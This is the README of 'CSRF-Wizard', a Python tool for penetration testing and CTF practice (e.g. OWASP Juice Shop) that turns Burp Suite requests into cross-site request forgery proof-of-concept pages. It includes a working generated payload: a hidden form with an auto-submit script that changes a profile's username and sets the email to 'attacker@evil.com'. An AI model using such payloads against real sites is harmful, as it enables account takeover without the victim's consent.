# CSRF-Wizard
A lightweight, interactive Python utility designed to accelerate **Cross-Site Request Forgery (CSRF)** vulnerability validation during penetration testing and CTF challenges (such as OWASP Juice Shop 3 star challenge CSRF). 

The tool automatically parses raw HTTP requests intercepted from **Burp Suite**, discovers data parameters, and prompts the user to dynamically adjust payload values before exporting a fully automated HTML Proof of Concept (PoC).

## Features
* **Raw Request Parsing:** Instantly extracts the HTTP method, targeted URL host path, and data parameters from any pasted Burp Suite `.txt` file.
* **Interactive Payload Modification:** Automatically identifies parameter keys and allows you to either supply new custom values or press `Enter` to retain the original values.
* **Automated PoC Generation:** Outputs a clean HTML document featuring hidden input fields and an integrated JavaScript auto-submit trigger (`form.submit()`) to execute instantly upon load.
* **Graceful Interrupt Handling:** Captures system exit interrupts cleanly without exposing messy backtraces.

## Installation
Ensure you have Python 3 installed. No external packages or third-party dependencies are required.

```bash
git clone https://github.com/eMVee-NL/CSRF-Wizard.git
cd CSRF-Wizard
```
## Usage

1. Intercept the target HTTP request in **Burp Suite**.
2. Copy the entire raw request and save it into a text file (e.g., `request.txt`).
3. Run the generator script:

```bash
python3 csrf-wizard.py
```

### Execution Workflow
```text
 === Interactive CSRF PoC Exploit Generator ===
[?] Enter the path to the Burp request (.txt) file: request.txt
[?] What should the HTML file be named? (e.g., csrf.html): exploit.html

[!] Parameters detected! Enter the new value (or press Enter to keep the original value):
    -> Value for 'username' (Original: 'emveenl'): admin_compromised
    -> Value for 'email' (Original: 'jim@juice-sh.op'): attacker@evil.com

[+] Successfully saved as: exploit.html

=== GENERATED HTML OUTPUT ===
<!DOCTYPE html>
<html>
  <body>
    <form id="csrfForm" action="http://localhost:3000/profile" method="POST">
      <input type="hidden" name="username" value="admin_compromised" />
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
==============================
```
<img width="746" height="677" alt="afbeelding" src="https://github.com/user-attachments/assets/9f4c90b1-9466-4fff-9a34-f17d67209c1c" />

## Disclaimer
This tool is created strictly for authorized security auditing, educational purposes, and Capture The Flag (CTF) competitions. Do not use this tool against infrastructure without explicit prior permission from the system owner.
